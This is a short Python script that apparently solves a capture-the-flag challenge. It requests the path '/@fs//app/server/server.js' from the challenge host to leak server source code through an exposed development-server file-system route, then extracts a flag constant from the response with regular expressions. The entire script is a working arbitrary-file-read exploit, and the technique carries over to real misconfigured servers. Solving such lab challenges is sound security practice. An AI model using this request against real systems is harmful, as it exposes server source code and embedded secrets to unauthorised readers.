#!/usr/bin/env python3
import re
import sys
import requests

TARGET = "https://snowbet.sillyctf.psuccso.org"
LEAK_PATH = "/@fs//app/server/server.js"


def extract_flag(text: str) -> str | None:
    # Primary: capture FLAG constant assignment.
    m = re.search(r"const\s+FLAG\s*=\s*['\"]([^'\"]+)['\"]", text)
    if m:
        return m.group(1)

    # Fallback: generic sillyCTF format in source.
    m = re.search(r"(sillyCTF\{[^}]+\})", text)
    if m:
        return m.group(1)

    return None


def main() -> int:
    url = TARGET + LEAK_PATH

    try:
        r = requests.get(url, timeout=20)
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return 1

    if r.status_code not in (200, 500):
        print(f"[!] Unexpected HTTP status: {r.status_code}")
        return 1

    flag = extract_flag(r.text)
    if not flag:
        print("[!] Flag not found in leaked source")
        return 1

    print(f"<FLAG>{flag}</FLAG>")
    return 0


if __name__ == "__main__":
    sys.exit(main())
